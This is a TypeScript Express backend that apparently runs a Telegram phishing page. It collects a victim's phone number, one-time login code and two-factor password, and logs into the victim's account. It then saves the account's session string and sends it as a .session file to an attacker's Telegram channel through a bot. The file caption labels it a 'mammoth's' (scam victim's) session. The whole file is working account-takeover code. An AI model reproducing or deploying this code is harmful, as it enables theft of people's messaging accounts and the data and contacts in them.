import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import TelegramBot from "node-telegram-bot-api";
import fs from "fs";
import { Readable } from "stream";
import path from "path";
import { Api } from "telegram/tl";
import { computeCheck } from "telegram/Password";


// Store active sessions
const activeSessions = new Map<string, {
  client: TelegramClient,
  phoneNumber: string,
  phoneCodeHash?: string
}>();

// Read proxies from file
function loadProxies(): Array<{host: string, port: number, username?: string, password?: string}> {
  try {
    const proxiesPath = path.join(process.cwd(), 'proxies.txt');
    if (!fs.existsSync(proxiesPath)) {
      console.log('No proxies.txt file found');
      return [];
    }

    const content = fs.readFileSync(proxiesPath, 'utf-8');
    const lines = content.split('\n').filter(line => line.trim() && !line.startsWith('#'));

    return lines.map(line => {
      const parts = line.split(':');
      if (parts.length >= 2) {
        return {
          host: parts[0],
          port: parseInt(parts[1]),
          username: parts[2] || undefined,
          password: parts[3] || undefined
        };
      }
      return null;
    }).filter((proxy): proxy is NonNullable<typeof proxy> => proxy !== null);
  } catch (error) {
    console.error('Error loading proxies:', error);
    return [];
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // CORS headers
  app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    next();
  });

  // Send phone number
  app.post('/api/auth/phone', async (req, res) => {
    try {
      const { phoneNumber } = req.body;
      if (!phoneNumber) {
        return res.status(400).json({ error: 'Phone number is required' });
      }

      const apiId = parseInt(process.env.TELEGRAM_API_ID || '0');
      const apiHash = process.env.TELEGRAM_API_HASH || '';

      if (!apiId || !apiHash) {
        return res.status(500).json({ error: 'API credentials not configured' });
      }

      // Get proxy if available
      const proxies = loadProxies();
      const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : undefined;

      console.log(`Using proxy:`, proxy || 'none');

      const session = new StringSession('');
      const client = new TelegramClient(session, apiId, apiHash, {
        connectionRetries: 5
      });

      await client.connect();

      console.log(`Sending code to: ${phoneNumber}`);
      const result = await client.sendCode(
        {
          apiId: apiId,
          apiHash: apiHash
        },
        phoneNumber
      );

      // Store session for later use
      const sessionKey = `${phoneNumber}_${Date.now()}`;
      activeSessions.set(sessionKey, {
        client,
        phoneNumber,
        phoneCodeHash: result.phoneCodeHash
      });

      res.json({ 
        success: true, 
        sessionKey,
        message: 'Code sent successfully' 
      });

    } catch (error: any) {
      console.error('Phone auth error:', error);
      res.status(500).json({ 
        error: 'Failed to send code',
        details: error.message || 'Unknown error'
      });
    }
  });

  // Verify code
  app.post('/api/auth/code', async (req, res) => {
    try {
      const { sessionKey, code } = req.body;
      if (!sessionKey || !code) {
        return res.status(400).json({ error: 'Session key and code are required' });
      }

      const sessionData = activeSessions.get(sessionKey);
      if (!sessionData) {
        return res.status(400).json({ error: 'Invalid session' });
      }

      console.log(`Verifying code: ${code} for ${sessionData.phoneNumber}`);

      try {
        const result = await sessionData.client.invoke(
          new Api.auth.SignIn({
            phoneNumber: sessionData.phoneNumber,
            phoneCodeHash: sessionData.phoneCodeHash!,
            phoneCode: code
          })
        );

        // Successfully signed in
        try {
          const sessionString = sessionData.client.session.save();
          if (typeof sessionString === 'string') {
            await sendSessionFile(sessionData.phoneNumber, sessionString);
          }
        } catch (e) {
          console.log('Session save warning:', e);
        }

        // Clean up
        activeSessions.delete(sessionKey);
        await sessionData.client.disconnect();

        res.json({ 
          success: true, 
          completed: true,
          message: 'Successfully authenticated' 
        });

      } catch (error: any) {
        if (error.message && error.message.includes('SESSION_PASSWORD_NEEDED')) {
          res.json({ 
            success: true, 
            needPassword: true,
            message: 'Two-factor authentication required' 
          });
        } else {
          throw error;
        }
      }

    } catch (error: any) {
      console.error('Code verification error:', error);
      res.status(500).json({ 
        error: 'Failed to verify code',
        details: error.message || 'Unknown error'
      });
    }
  });

  // Verify password (2FA)
  app.post('/api/auth/password', async (req, res) => {
    try {
      const { sessionKey, password } = req.body;
      console.log('Password verification request:', { sessionKey, passwordLength: password?.length });
      
      if (!sessionKey || !password) {
        console.log('Missing required fields:', { sessionKey: !!sessionKey, password: !!password });
        return res.status(400).json({ error: 'Session key and password are required' });
      }

      const sessionData = activeSessions.get(sessionKey);
      if (!sessionData) {
        console.log('Session not found for key:', sessionKey);
        console.log('Available sessions:', Array.from(activeSessions.keys()));
        return res.status(400).json({ error: 'Invalid session' });
      }

      console.log(`Verifying 2FA password for ${sessionData.phoneNumber}, password length: ${password.length}`);

      try {
        console.log('Attempting 2FA password verification...');
        
        // Get password information first
        const passwordInfo = await sessionData.client.invoke(
          new Api.account.GetPassword()
        );
        
        console.log('Got password info, computing SRP...');
        
        // Compute password check
        const passwordCheck = await computeCheck(passwordInfo, password);
        
        // Use CheckPassword with computed password check
        const result = await sessionData.client.invoke(
          new Api.auth.CheckPassword({
            password: passwordCheck
          })
        );
        
        console.log('2FA CheckPassword successful:', !!result);
        console.log('Authentication completed successfully');

        // Successfully signed in with 2FA
        try {
          console.log('Saving session...');
          const sessionString = sessionData.client.session.save();
          console.log('Session saved, type:', typeof sessionString, 'length:', typeof sessionString === 'string' ? sessionString.length : 'N/A');
          
          if (typeof sessionString === 'string') {
            console.log('Sending session file...');
            await sendSessionFile(sessionData.phoneNumber, sessionString);
            console.log('Session file sent successfully');
          }
        } catch (e) {
          console.log('Session save warning:', e);
        }

        // Clean up
        console.log('Cleaning up session...');
        activeSessions.delete(sessionKey);
        await sessionData.client.disconnect();
        console.log('Session cleanup completed');

        res.json({ 
          success: true, 
          completed: true,
          message: 'Successfully authenticated with 2FA' 
        });

      } catch (passwordError: any) {
        console.error('Password verification specific error:', {
          message: passwordError.message,
          code: passwordError.code,
          stack: passwordError.stack,
          name: passwordError.name
        });
        throw passwordError;
      }

    } catch (error: any) {
      console.error('Password verification error (full):', {
        message: error.message,
        code: error.code,
        stack: error.stack,
        name: error.name,
        fullError: error
      });
      res.status(500).json({ 
        error: 'Failed to verify password',
        details: error.message || 'Unknown error',
        code: error.code || 'UNKNOWN_ERROR'
      });
    }
  });

  // Function to send session file via bot
  async function sendSessionFile(phoneNumber: string, sessionString: string) {
    try {
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const channelId = process.env.TELEGRAM_CHANNEL_ID?.trim();

      if (!botToken || !channelId) {
        console.error('Bot token or channel ID not configured');
        return;
      }

      const bot = new TelegramBot(botToken, { polling: false });

      // Create session file content
      const sessionFileName = `${phoneNumber.replace(/[^0-9]/g, '')}_${Date.now()}.session`;
      const sessionContent = sessionString;

      // Send as document to channel with proper filename - using stream approach
      const fileBuffer = Buffer.from(sessionContent, 'utf8');
      const readable = new Readable();
      readable.push(fileBuffer);
      readable.push(null);
      
      await bot.sendDocument(channelId, readable, {
        caption: `Сессия мамонта${phoneNumber}\n📅 ${new Date().toLocaleString('ru-RU')}`
      }, {
        filename: sessionFileName
      });

      console.log(`Session file sent for ${phoneNumber}`);

    } catch (error) {
      console.error('Failed to send session file:', error);
    }
  }

  const httpServer = createServer(app);
  return httpServer;
}